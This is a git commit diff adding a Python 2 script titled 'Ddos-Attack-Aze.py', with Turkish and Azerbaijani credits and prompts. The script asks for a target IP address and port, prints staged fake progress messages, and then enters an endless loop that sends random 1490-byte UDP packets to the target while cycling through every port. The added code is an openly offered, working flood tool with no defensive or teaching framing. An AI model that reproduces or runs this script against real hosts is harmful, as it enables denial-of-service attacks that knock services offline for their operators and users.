29835fce39a3fc59c699494e50e3e8cc84a39bf0
vaio.root <68550165+vaio-php@users.noreply.github.com>
2021-11-21 18:35:34 +0400

    Update Ddos-Attack-Aze.py

--- Ddos-Attack-Aze.py
+++ Ddos-Attack-Aze.py
@@ -1,10 +1,50 @@
-print("""
-[H]=========HARMAN========[-][o][x]
-|                                 |
-|     Programa Hoşgeldiniz!       |
-|           Sürüm 0.8             |
-|    Devam etmek için herhangi    |
-|       bir düğmeye basın.        |
-|                                 |
-|=================================|
-""")
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system(" DDos Attack")
+print
+print "Hazirlayan  : Vaio.php"
+print "Instagram : instagram.com/vaio.php"
+
+
+print
+ip = raw_input("IP Unvani : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "Basladi 0% "
+time.sleep(5)
+print "[Gozle] 25%"
+time.sleep(5)
+print "[Sebrli Ol] 50%"
+time.sleep(5)
+print "[Catdama yuklendi] 75%"
+time.sleep(5)
+print "Hazirdi 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
